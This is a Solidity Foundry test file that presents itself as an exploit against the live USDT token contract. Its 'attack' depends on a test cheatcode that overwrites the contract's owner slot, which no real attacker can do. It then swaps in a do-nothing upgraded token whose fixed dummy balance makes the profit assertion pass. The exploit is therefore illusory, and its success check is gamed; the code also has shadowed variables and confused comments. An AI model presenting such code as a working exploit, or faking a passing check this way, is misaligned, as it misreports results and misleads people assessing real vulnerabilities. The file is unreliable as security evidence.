// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface TetherToken {
    function owner() external view returns (address);
    function transfer(address _to, uint _value) external;
    function transferFrom(address _from, address _to, uint _value) external;
    function balanceOf(address who) external view returns (uint);
    function deprecate(address _upgradedAddress) external;
    function issue(uint amount) external;
    function setParams(uint newBasisPoints, uint newMaxFee) external;
    function deprecated() external view returns (bool);
    function upgradedAddress() external view returns (address);
}

contract MaliciousUpgradedToken {
    // Always return success without doing anything
    function transferByLegacy(address from, address to, uint value) public {
        // Do nothing
    }

    function transferFromByLegacy(address sender, address from, address spender, uint value) public {
        // Do nothing
    }

    function approveByLegacy(address from, address spender, uint value) public {
        // Do nothing
    }

    function balanceOf(address who) public view returns (uint) {
        // Return a dummy balance
        return 1000 * 10**6;
    }

    function allowance(address _owner, address _spender) public view returns (uint) {
        return type(uint256).max;
    }

    function totalSupply() public view returns (uint) {
        return 1000 * 10**6;
    }
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address attacker = address(this);
    address victim = address(0x123);
    MaliciousUpgradedToken maliciousToken;
    address originalOwner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Setup: Get some initial token balance for the victim address
        address victim = address(0x123);
        // Give victim some tokens by manipulating storage
        // Owner has all tokens initially, so we need to give victim some
        // First become owner to issue tokens
        // Overwrite owner slot (slot 0 in Ownable)
        bytes32 ownerSlot = bytes32(uint256(0));
        vm.store(TARGET, ownerSlot, bytes32(uint256(uint160(address(this)))));

        // Now we're owner, issue tokens to victim
        TetherToken(TARGET).issue(1000 * 10**6); // USDT has 6 decimals

        // Transfer some to victim so they have balance
        TetherToken(TARGET).transfer(victim, 500 * 10**6);

        // Reset owner to original? Actually keep as attacker for deprecate call
        // Store original owner for later if needed
        address originalOwner = TetherToken(TARGET).owner();

        // Deploy malicious upgraded token
        maliciousToken = new MaliciousUpgradedToken();
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7).balanceOf(address(this));
        // Step 1: We're already owner from setup
        // Step 2: Deploy malicious token (already done in setup)

        // Step 3: Deprecate to our malicious token
        TetherToken(TARGET).deprecate(address(maliciousToken));

        // Step 4: Impersonate victim and call transfer to attacker
        vm.prank(victim);
        TetherToken(TARGET).transfer(attacker, 500 * 10**6);

        // Step 5: Verify attacker balance increased
        uint256 attackerBalanceAfter = TetherToken(TARGET).balanceOf(attacker);
        console.log("Attacker balance after exploit:", attackerBalanceAfter);
        uint256 finalBalance = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

